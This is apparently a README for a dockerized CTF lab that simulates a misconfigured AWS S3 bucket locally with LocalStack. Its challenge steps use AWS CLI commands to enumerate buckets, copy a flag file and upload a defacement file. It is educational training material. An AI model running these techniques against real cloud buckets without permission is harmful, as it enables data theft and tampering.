# Hacksudo S3 Cloud CTF Lab

🚀 **Hacksudo S3 Cloud** is a fully dockerized vulnerable AWS S3 environment designed for learning and practicing S3 bucket misconfigurations and exploitation techniques.

This lab uses **LocalStack** to simulate AWS S3 services locally without requiring any real AWS account.

---

## 🎯 Purpose

The goal of this project is to help security students and professionals understand:

- How misconfigured S3 buckets are discovered  
- How attackers enumerate public buckets  
- Reading sensitive files from S3  
- Uploading malicious files to writable buckets  
- Understanding real-world S3 exploitation scenarios  

---

## 🔥 Lab Features

- Fully offline Docker-based lab  
- No real AWS account required  
- Auto bucket creation on startup  
- Read/Write permissions enabled  
- Preloaded vulnerable files  
- Beginner-friendly CTF style  
- Walkthrough friendly  

---

## 🛠 Requirements

You only need:

- Docker  
- Docker Compose  
- AWS CLI  

---

## 📥 Installation

### Clone Repository

```bash
git clone https://github.com/hacksudo/hacksudos3cloud.git
cd hacksudos3cloud
```
### Start the Lab
```
sudo docker compose up -d
```
### 🧪 Verification
```
docker ps
```

## 🧩 CTF Challenge Steps
### 1. Discover Buckets
```
aws --endpoint-url=http://localhost:4566 s3 ls
```
### 2. List Files in Bucket
```
aws --endpoint-url=http://localhost:4566 s3 ls s3://hacksudos3lab
```
### 3. Read Sensitive Data
```
aws --endpoint-url=http://localhost:4566 s3 cp s3://hacksudos3lab/flag.txt .

```
### 4. Upload Your Own File (Exploitation)
```
echo "hacked by attacker" > hacked.html
aws --endpoint-url=http://localhost:4566 s3 cp hacked.html s3://hacksudos3lab/
```
### 5. Access via Browser
```
http://localhost:4566/hacksudos3lab/index.html
```
## 🎯 CTF Objective

Find the hidden flag.txt file and understand how public S3 misconfigurations can be exploited.

## 🧹 Cleanup
To remove everything:
```
docker-compose down
docker system prune -a
```
## 🐳 Docker Hub
Pull ready-made image:
```
docker pull hacksudo/hacksudos3cloud
```
Run directly:
```
docker run -d -p 4566:4566 --name hacksudo-s3 hacksudo/hacksudos3cloud
```
## ⚠ Disclaimer

This lab is strictly for educational and ethical hacking practice only.
Do not use these techniques on real AWS environments without permission.


